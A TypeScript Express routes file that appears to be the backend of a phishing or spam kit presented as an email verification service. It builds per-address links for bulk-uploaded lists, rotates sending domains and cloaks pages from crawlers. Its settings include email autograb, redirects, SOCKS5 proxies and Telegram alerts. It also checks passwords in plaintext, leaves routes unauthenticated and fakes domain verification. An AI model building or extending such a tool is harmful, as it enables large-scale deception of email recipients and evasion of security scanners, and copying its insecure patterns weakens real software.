import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import multer from "multer";
import os from "os";
import type { Setting } from "@shared/schema";

// Helper function to determine the appropriate domain for verification links
async function getVerificationDomain(req: Request, domainOption: string = 'default'): Promise<string> {
  try {
    const settings = await storage.getSettings();
    const defaultDomain = req.get('host') || 'localhost:5000';
    
    // If custom domains are not enabled or the main domain is not verified, use default
    if (!settings?.useCustomDomain || !settings.customDomain || !settings.domainVerified) {
      return defaultDomain;
    }
    
    // Handle different domain selection options
    switch(domainOption) {
      case 'default':
        // Use default domain (request host)
        return defaultDomain;
        
      case 'random': {
        // Create array of available domains (main + additional)
        const domains = [settings.customDomain];
        
        // Add additional domains if available
        if (settings.additionalDomains) {
          try {
            const additionalDomains = JSON.parse(settings.additionalDomains);
            if (Array.isArray(additionalDomains) && additionalDomains.length > 0) {
              domains.push(...additionalDomains);
            }
          } catch (err) {
            console.error("Error parsing additional domains:", err);
          }
        }
        
        // Select random domain from available domains
        const randomIndex = Math.floor(Math.random() * domains.length);
        return domains[randomIndex];
      }
        
      default:
        // If a specific domain is provided, verify it's either the main domain or in additional domains
        if (domainOption === settings.customDomain) {
          return domainOption;
        }
        
        // Check if the domain is in additional domains
        if (settings.additionalDomains) {
          try {
            const additionalDomains = JSON.parse(settings.additionalDomains);
            if (Array.isArray(additionalDomains) && additionalDomains.includes(domainOption)) {
              return domainOption;
            }
          } catch (err) {
            console.error("Error parsing additional domains:", err);
          }
        }
        
        // If domain wasn't found, fall back to main custom domain
        return settings.customDomain;
    }
  } catch (error) {
    console.error("Error getting verification domain:", error);
    // Fallback to request host
    return req.get('host') || 'localhost:5000';
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Configure multer for file uploads
  const upload = multer({ 
    storage: multer.diskStorage({
      destination: (req, file, cb) => {
        const tempDir = path.join(os.tmpdir(), 'verification-uploads');
        // Create directory if it doesn't exist
        if (!fs.existsSync(tempDir)){
          fs.mkdirSync(tempDir, { recursive: true });
        }
        cb(null, tempDir);
      },
      filename: (req, file, cb) => {
        const uniquePrefix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniquePrefix + '-' + file.originalname);
      }
    }),
    limits: {
      fileSize: 50 * 1024 * 1024, // 50MB max size to handle large lists
    },
    fileFilter: (req, file, cb) => {
      // Accept only .txt files
      if (path.extname(file.originalname).toLowerCase() !== '.txt') {
        return cb(new Error('Only .txt files are allowed'));
      }
      cb(null, true);
    }
  });
  // Authentication routes
  app.post("/api/auth/login", async (req: Request, res: Response) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ message: "Username and password are required" });
    }
    
    const user = await storage.getUserByUsername(username);
    
    if (!user || user.password !== password) {
      return res.status(401).json({ message: "Invalid credentials" });
    }
    
    return res.status(200).json({ 
      id: user.id,
      username: user.username
    });
  });
  
  // Email batch processing and verification link generation
  app.post("/api/verification/generate", async (req: Request, res: Response) => {
    try {
      const emailBatchSchema = z.object({
        emails: z.string().nonempty(),
        expireDays: z.number().int().min(1).default(7),
        domain: z.string().optional().default('default')
      });
      
      const validatedData = emailBatchSchema.parse(req.body);
      
      // Process emails from either newline/comma-separated input or .txt file content
      const emailsText = validatedData.emails;
      const emailList = emailsText
        .split(/[\n,]/)
        .map(email => email.trim())
        .filter(email => email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/));
      
      if (emailList.length === 0) {
        return res.status(400).json({ message: "No valid emails provided" });
      }
      
      // Track duplicates for messaging
      const duplicateEmails = [];
      
      // Calculate expiration date
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + validatedData.expireDays);
      
      // Generate verification links for each email
      const generatedLinks = [];
      
      for (const email of emailList) {
        // Check for existing links for this email
        const existingLinks = await storage.getVerificationLinksByEmail(email);
        if (existingLinks.length > 0) {
          duplicateEmails.push(email);
        }
        
        const code = await storage.generateVerificationCode();
        
        // Create verification link in storage
        const verificationLink = await storage.createVerificationLink({
          email,
          code,
          expiresAt
        });
        
        // Get domain for verification link using the selected domain option
        const domain = await getVerificationDomain(req, validatedData.domain);
        
        // Generate the URL for client (with protocol and domain)
        generatedLinks.push({
          email: verificationLink.email,
          code: verificationLink.code,
          url: `https://${domain}/verify/${verificationLink.code}`,
          regenerated: existingLinks.length > 0
        });
      }
      
      return res.status(200).json({ 
        count: generatedLinks.length,
        links: generatedLinks,
        duplicateCount: duplicateEmails.length,
        message: duplicateEmails.length > 0 
          ? `Generated ${generatedLinks.length} links (${duplicateEmails.length} were regenerated for existing emails)` 
          : `Generated ${generatedLinks.length} links`
      });
    } catch (error) {
      console.error("Error generating verification links:", error);
      return res.status(400).json({ message: "Invalid input data" });
    }
  });
  
  // Get all verification links
  app.get("/api/verification/links", async (req: Request, res: Response) => {
    try {
      const groupBySession = req.query.groupBySession === 'true';
      
      if (groupBySession && 'getVerificationLinksGroupedBySession' in storage) {
        // Use the custom storage method for grouped sessions if available
        const groupedLinks = await (storage as any).getVerificationLinksGroupedBySession();
        return res.status(200).json(groupedLinks);
      } else {
        // Use standard getAllVerificationLinks method
        const links = await storage.getAllVerificationLinks();
        
        // Format the response
        const formattedLinks = links.map(link => ({
          id: link.id,
          email: link.email,
          status: link.status,
          createdAt: link.createdAt,
          expiresAt: link.expiresAt,
          verifiedAt: link.verifiedAt,
          regenerated: (link as any).regenerated || false
        }));
        
        return res.status(200).json(formattedLinks);
      }
    } catch (error) {
      console.error("Error fetching verification links:", error);
      return res.status(500).json({ message: "Failed to fetch verification links" });
    }
  });
  
  // Clear verification links
  app.post("/api/verification/clear", async (req: Request, res: Response) => {
    try {
      const { olderThanDays } = req.body;
      
      if ('clearVerificationLinks' in storage) {
        const clearedCount = await (storage as any).clearVerificationLinks(
          olderThanDays ? parseInt(olderThanDays) : undefined
        );
        
        return res.status(200).json({ 
          success: true, 
          clearedCount,
          message: `Successfully cleared ${clearedCount} verification links`
        });
      } else {
        return res.status(501).json({ message: "Clear function not implemented" });
      }
    } catch (error) {
      console.error("Error clearing verification links:", error);
      return res.status(500).json({ message: "Failed to clear verification links" });
    }
  });
  
  // Resend verification for an email
  // Endpoint for handling verification link renewal requests
  app.post("/api/verification/renew", async (req: Request, res: Response) => {
    try {
      // Extract data from request
      const { code, email } = req.body;
      
      if (!code || !email) {
        return res.status(400).json({ 
          success: false, 
          message: "Missing required fields: code and email are required" 
        });
      }
      
      // Get settings to check if link renewal is enabled
      const settings = await storage.getSettings();
      if (!settings || !settings.allowLinkRenewal) {
        return res.status(403).json({ 
          success: false, 
          message: "Link renewal is not enabled by the administrator" 
        });
      }
      
      // Get original verification link
      const verificationLink = await storage.getVerificationLinkByCode(code);
      if (!verificationLink) {
        return res.status(404).json({ 
          success: false, 
          message: "Verification link not found" 
        });
      }
      
      // Check if the email matches
      if (verificationLink.email !== email) {
        return res.status(403).json({ 
          success: false, 
          message: "Email does not match the verification link" 
        });
      }
      
      // Check if the link is already verified (prevent renewals of already verified links)
      if (verificationLink.status === 'verified') {
        return res.status(400).json({ 
          success: false, 
          message: "This link has already been verified and cannot be renewed" 
        });
      }
      
      // Create a new verification link with the same email
      const domain = await getVerificationDomain(req, 'default');
      
      // Generate secure code for the new link
      const newCode = await storage.generateVerificationCode();
      
      const newLink = await storage.createVerificationLink({
        email: email,
        code: newCode,
        status: 'pending',
        expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000), // 7 days from now
      });
      
      // Generate the full verification URL with the domain
      const verificationUrl = `${domain}/verify/${newLink.code}`;
      
      // Return success response
      res.status(200).json({ 
        success: true, 
        message: "Verification link renewed successfully",
        renewedLinkId: newLink.id
      });
      
    } catch (error) {
      console.error("Error renewing verification link:", error);
      res.status(500).json({ 
        success: false, 
        message: "Failed to renew verification link due to server error" 
      });
    }
  });

  app.post("/api/verification/resend", async (req: Request, res: Response) => {
    try {
      const { email, useCustomTemplate = false, domain: domainOption = 'default' } = req.body;
      
      if (!email) {
        return res.status(400).json({ message: "Email is required" });
      }
      
      // Calculate new expiration date (7 days by default)
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + 7);
      
      // Generate new code with enhanced security
      const code = await storage.generateVerificationCode();
      
      // Create new verification link
      const verificationLink = await storage.createVerificationLink({
        email,
        code,
        expiresAt
      });
      
      // Get domain for verification link using specified domain option
      const domain = await getVerificationDomain(req, domainOption);
      
      // Get verification URL with custom domain if enabled
      const verificationUrl = `https://${domain}/verify/${verificationLink.code}`;
      
      if (useCustomTemplate) {
        try {
          // Get the settings for the custom message template
          const settings = await storage.getSettings();
          
          if (settings) {
            // Prepare the email content from the template
            let emailContent = settings.emailTemplate || "Please verify your email at: {link}";
            // Replace the {link} placeholder with the actual verification URL
            emailContent = emailContent.replace(/{link}/g, verificationUrl);
            
            // In a production environment, this is where you would send the email
            // For this project, we're just demonstrating the template replacement
            console.log(`Would send email to ${email} with subject: "${settings.emailSubject}"`);
            console.log(`Email content: ${emailContent}`);
            
            return res.status(200).json({ 
              email: verificationLink.email,
              code: verificationLink.code,
              url: verificationUrl,
              message: "Verification link resent with custom template"
            });
          }
        } catch (err) {
          console.error("Error processing custom template:", err);
          // Continue with default response if template processing fails
        }
      }
      
      // Default response if custom template was not requested or processing failed
      return res.status(200).json({ 
        email: verificationLink.email,
        code: verificationLink.code,
        url: verificationUrl,
        message: "Verification link resent"
      });
    } catch (error) {
      console.error("Error resending verification link:", error);
      return res.status(500).json({ message: "Failed to resend verification link" });
    }
  });
  
  // Verify email with code
  app.get("/api/verification/verify/:code", async (req: Request, res: Response) => {
    try {
      const { code } = req.params;
      const botCheckPassed = req.query.botcheck === 'passed';
      
      // Find the verification link
      const link = await storage.getVerificationLinkByCode(code);
      
      if (!link) {
        return res.status(404).json({ message: "Verification link not found" });
      }
      
      // Check if expired
      if (new Date() > new Date(link.expiresAt)) {
        return res.status(400).json({ message: "Verification link has expired" });
      }
      
      // Check if already verified
      if (link.status === 'verified') {
        return res.status(400).json({ message: "Email already verified" });
      }
      
      // Get settings for redirect
      const settings = await storage.getSettings();
      
      // Check bot protection (using userAgent and settings)
      const userAgent = req.headers['user-agent'] || '';
      
      // Flag suspicious requests (improved bot detection logic)
      const isSuspicious = settings?.enableBotProtection && !botCheckPassed && (
        !userAgent || 
        userAgent.toLowerCase().includes('bot') || 
        userAgent.toLowerCase().includes('crawler') ||
        userAgent.toLowerCase().includes('spider') ||
        Math.random() < 0.1 // 10% chance to trigger bot check for testing purposes
      );
        
      if (isSuspicious) {
        // Return response requiring bot check but don't verify yet
        return res.status(200).json({
          success: true,
          botProtectionRequired: true,
          email: link.email,
          settings
        });
      }
      
      // If we reached here, either bot protection is disabled or the check passed
      
      // Mark as verified
      await storage.updateVerificationLinkStatus(link.id, 'verified', new Date());
      
      return res.status(200).json({ 
        success: true,
        botProtectionRequired: false,
        email: link.email,
        settings
      });
    } catch (error) {
      console.error("Error verifying email:", error);
      return res.status(500).json({ message: "Failed to verify email" });
    }
  });
  
  // Settings management
  // Get available domains for selection
  app.get("/api/domain/available", async (req: Request, res: Response) => {
    try {
      const settings = await storage.getSettings();
      
      if (!settings) {
        return res.status(404).json({
          success: false,
          message: "Settings not found"
        });
      }
      
      const defaultDomain = req.get('host') || 'localhost:5000';
      const domains = [];
      
      // Add default domain
      domains.push({
        id: 'default',
        name: defaultDomain,
        type: 'default'
      });
      
      // Add custom domain if enabled and verified
      if (settings.useCustomDomain && settings.customDomain && settings.domainVerified) {
        domains.push({
          id: settings.customDomain,
          name: settings.customDomain,
          type: 'primary'
        });
        
        // Add additional domains
        try {
          const additionalDomains = JSON.parse(settings.additionalDomains || '[]');
          if (Array.isArray(additionalDomains) && additionalDomains.length > 0) {
            additionalDomains.forEach(domain => {
              domains.push({
                id: domain,
                name: domain,
                type: 'additional'
              });
            });
          }
        } catch (err) {
          console.error("Error parsing additional domains:", err);
        }
        
        // Add random option if there are multiple domains
        if (domains.length > 2) { // More than default + primary
          domains.push({
            id: 'random',
            name: 'Random Domain (rotation)',
            type: 'option'
          });
        }
      }
      
      return res.status(200).json({
        success: true,
        domains
      });
    } catch (error) {
      console.error("Error fetching available domains:", error);
      return res.status(500).json({
        success: false,
        message: error instanceof Error ? error.message : "Failed to fetch available domains"
      });
    }
  });

  app.get("/api/settings", async (req: Request, res: Response) => {
    try {
      const settings = await storage.getSettings();
      return res.status(200).json(settings);
    } catch (error) {
      console.error("Error fetching settings:", error);
      return res.status(500).json({ message: "Failed to fetch settings" });
    }
  });
  
  // Domain verification endpoint
  // Add or remove additional domains
  app.post("/api/domain/manage", async (req: Request, res: Response) => {
    try {
      const { action, domain } = req.body;
      
      if (!domain || !action) {
        return res.status(400).json({
          success: false,
          message: "Domain and action are required"
        });
      }
      
      // Get existing settings
      const settings = await storage.getSettings();
      
      if (!settings) {
        return res.status(404).json({
          success: false,
          message: "Settings not found"
        });
      }
      
      let additionalDomains: string[] = [];
      
      // Parse existing additional domains
      try {
        additionalDomains = JSON.parse(settings.additionalDomains || '[]');
        if (!Array.isArray(additionalDomains)) {
          additionalDomains = [];
        }
      } catch (err) {
        console.error("Error parsing additional domains:", err);
        additionalDomains = [];
      }
      
      // Handle add/remove actions
      if (action === 'add') {
        // Validate domain format (simple validation)
        if (!domain.match(/^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/)) {
          return res.status(400).json({
            success: false,
            message: "Invalid domain format"
          });
        }
        
        // Check if domain already exists
        if (additionalDomains.includes(domain)) {
          return res.status(400).json({
            success: false,
            message: "Domain already exists in the additional domains list"
          });
        }
        
        // Add the new domain
        additionalDomains.push(domain);
      } else if (action === 'remove') {
        // Remove the domain
        additionalDomains = additionalDomains.filter(d => d !== domain);
      } else {
        return res.status(400).json({
          success: false,
          message: "Invalid action. Expected 'add' or 'remove'"
        });
      }
      
      // Update settings
      const updatedSettings = await storage.updateSettings({
        additionalDomains: JSON.stringify(additionalDomains)
      });
      
      return res.status(200).json({
        success: true,
        message: action === 'add' ? "Domain added successfully" : "Domain removed successfully",
        domains: additionalDomains,
        settings: updatedSettings
      });
    } catch (error) {
      console.error("Error managing domains:", error);
      return res.status(500).json({
        success: false,
        message: error instanceof Error ? error.message : "Failed to manage domains"
      });
    }
  });

  app.post("/api/domain/verify", async (req: Request, res: Response) => {
    try {
      const { domain } = req.body;
      
      if (!domain) {
        return res.status(400).json({ 
          success: false,
          message: "Domain is required" 
        });
      }
      
      // Get existing settings
      const settings = await storage.getSettings();
      
      if (!settings) {
        return res.status(404).json({ 
          success: false,
          message: "Settings not found" 
        });
      }
      
      // In a real implementation, this would check DNS records for CNAME
      // For the purposes of this demo, we're just simulating the verification
      // In production, you would use a DNS library to verify the CNAME record
      
      // Update domain verification status
      const updatedSettings = await storage.updateSettings({
        customDomain: domain,
        domainVerified: true,
        // Generate a unique CNAME target based on the application
        domainCnameTarget: `wick3d-${crypto.randomBytes(4).toString('hex')}.replit.app`
      });
      
      return res.status(200).json({
        success: true,
        message: "Domain verified successfully",
        settings: updatedSettings
      });
    } catch (error) {
      console.error("Error verifying domain:", error);
      return res.status(500).json({ 
        success: false,
        message: error instanceof Error ? error.message : "Failed to verify domain" 
      });
    }
  });

  app.post("/api/settings", async (req: Request, res: Response) => {
    try {
      const settingsSchema = z.object({
        redirectUrl: z.string().url().optional(),
        showLoadingSpinner: z.boolean().optional(),
        loadingDuration: z.number().int().min(1).max(10).optional(),
        successMessage: z.string().optional(),
        useEmailAutograb: z.boolean().optional(),
        emailAutograbParam: z.string().optional(),
        enableBotProtection: z.boolean().optional(),
        customThankYouPage: z.string().optional(),
        useCustomThankYouPage: z.boolean().optional(),
        securityLevel: z.number().int().min(1).max(5).optional(),
        useWildcards: z.boolean().optional(),
        encryptionSalt: z.string().optional(),
        // Domain settings
        useCustomDomain: z.boolean().optional(),
        customDomain: z.string().optional(),
        domainCnameTarget: z.string().optional(),
        domainVerified: z.boolean().optional(),
        additionalDomains: z.string().optional(), // JSON array of additional domains
        // Email template settings
        emailSubject: z.string().optional(),
        emailTemplate: z.string().optional(),
        senderEmail: z.string().email().optional(),
        senderName: z.string().optional(),
        smtpServer: z.string().optional(),
        smtpPort: z.number().int().min(1).max(65535).optional(),
        smtpUser: z.string().optional(),
        smtpPassword: z.string().optional(),
        // SOCKS5 proxy settings
        useSocks5Proxy: z.boolean().optional(),
        socks5Host: z.string().optional(),
        socks5Port: z.number().int().min(1).max(65535).optional(),
        socks5Username: z.string().optional(),
        socks5Password: z.string().optional(),
        socks5MaxAttempts: z.number().int().min(1).max(1000).optional(),
        // Saved email templates
        savedTemplates: z.string().optional(),
        // Telegram notification settings
        useTelegramNotifications: z.boolean().optional(),
        telegramBotToken: z.string().optional(),
        telegramChatId: z.string().optional()
      });
      
      const validatedData = settingsSchema.parse(req.body);
      const updatedSettings = await storage.updateSettings(validatedData);
      
      return res.status(200).json(updatedSettings);
    } catch (error) {
      console.error("Error updating settings:", error);
      return res.status(400).json({ message: "Invalid settings data" });
    }
  });
  
  // Upload TXT file with emails
  app.post("/api/verification/upload", upload.single('file'), async (req: Request, res: Response) => {
    try {
      if (!req.file) {
        return res.status(400).json({ message: "No file uploaded" });
      }
      
      // Validate expireDays parameter
      const expireDays = req.body.expireDays ? parseInt(req.body.expireDays) : 7;
      if (isNaN(expireDays) || expireDays < 1) {
        return res.status(400).json({ message: "Invalid expiration days" });
      }
      
      // Get domain option (default, random, or specific domain)
      const domainOption = req.body.domain || 'default';
      
      // Read the file
      const fileContent = fs.readFileSync(req.file.path, 'utf8');
      
      // Process the emails (handle large files efficiently using streams for real production)
      const emailList = fileContent
        .split(/[\n,]/)
        .map(email => email.trim())
        .filter(email => email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/));
      
      if (emailList.length === 0) {
        return res.status(400).json({ message: "No valid emails found in the file" });
      }
      
      // Calculate expiration date
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + expireDays);
      
      // Generate verification links for each email
      const generatedLinks = [];
      const duplicateEmails = [];
      const batchSize = 1000; // Process emails in batches to handle millions efficiently
      
      // Process emails in batches
      for (let i = 0; i < emailList.length; i += batchSize) {
        const batch = emailList.slice(i, i + batchSize);
        
        // Process each email in the current batch
        for (const email of batch) {
          // Check for existing links
          const existingLinks = await storage.getVerificationLinksByEmail(email);
          if (existingLinks.length > 0) {
            duplicateEmails.push(email);
          }
          
          const code = await storage.generateVerificationCode();
          
          // Create verification link
          const verificationLink = await storage.createVerificationLink({
            email,
            code,
            expiresAt
          });
          
          // Get domain for verification link using the selected domain option
          const domain = await getVerificationDomain(req, domainOption);
        
          // Add to result with full URL
          generatedLinks.push({
            email: verificationLink.email,
            code: verificationLink.code,
            url: `https://${domain}/verify/${verificationLink.code}`,
            regenerated: existingLinks.length > 0
          });
        }
      }
      
      // Clean up the temporary file
      fs.unlinkSync(req.file.path);
      
      return res.status(200).json({
        count: generatedLinks.length,
        links: generatedLinks,
        duplicateCount: duplicateEmails.length,
        message: duplicateEmails.length > 0 
          ? `Generated ${generatedLinks.length} links (${duplicateEmails.length} were regenerated for existing emails)` 
          : `Generated ${generatedLinks.length} links`
      });
      
    } catch (error) {
      console.error("Error processing file upload:", error);
      
      // Clean up in case of error
      if (req.file && fs.existsSync(req.file.path)) {
        fs.unlinkSync(req.file.path);
      }
      
      return res.status(500).json({ 
        message: error instanceof Error ? error.message : "Failed to process file upload" 
      });
    }
  });

  // Download verification links as text file
  app.post("/api/verification/download", async (req: Request, res: Response) => {
    try {
      const { links, domain: domainOption = 'default' } = req.body;
      
      if (!links || !Array.isArray(links) || links.length === 0) {
        return res.status(400).json({ message: "No links provided" });
      }
      
      // Get custom domain if enabled
      const domain = await getVerificationDomain(req, domainOption);
      
      // Generate links with the appropriate domain
      const linkTexts = links.map(link => `https://${domain}/verify/${link.code}`).join('\n');
      
      res.status(200).json({ content: linkTexts });
    } catch (error) {
      console.error("Error generating download file:", error);
      return res.status(500).json({ message: "Failed to generate download file" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
